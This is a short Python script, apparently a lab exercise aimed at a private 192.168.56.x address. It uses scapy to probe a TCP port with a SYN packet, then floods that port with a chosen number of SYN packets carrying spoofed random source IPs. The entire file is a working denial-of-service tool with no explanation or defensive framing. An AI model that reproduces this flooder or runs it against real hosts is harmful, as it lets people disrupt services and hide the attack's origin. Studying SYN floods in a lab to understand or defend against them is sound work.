from scapy.all import *
import socket



def is_open(ip, port, timeout=10):
    p = IP(dst=ip)/TCP(sport=RandShort(), dport=port, flags='S')  # Forging SYN packet
    resp = sr1(p, timeout=timeout)  # Send the packets

    if resp == None or not resp.haslayer(TCP):
        print("Resp type : ", type(resp))
        return False

    tcp_layer = resp.getlayer(TCP)
    if tcp_layer.flags == 0x12:
        return True
    elif tcp_layer.flags == 0x14:
        return False

    return False


def flood(ip, port, count) :
    print("Starting flooding with", count, "packets")
    for i in range(count) :
        ip_layer = IP(src=RandIP("192.168.1.1/24"), dst=ip)
        tcp_layer = TCP(sport=RandShort(), dport=port, flags='S')

        send(ip_layer / tcp_layer, verbose=0)
        
        if i % 1000 == 0 :
            print("Sent", i, "packets")

def main() :
    target_ip = "192.168.56.101"
    target_port = 2000

    if(is_open(target_ip, target_port)) :
        print(target_ip, ":", target_port, " is open, starting syn flooding")
        count = int(input("How many packets to send : "))
        flood(target_ip, target_port, count)
    else :
        print(target_ip, ":", target_port, " is closed, canceling syn flooding")

    


main()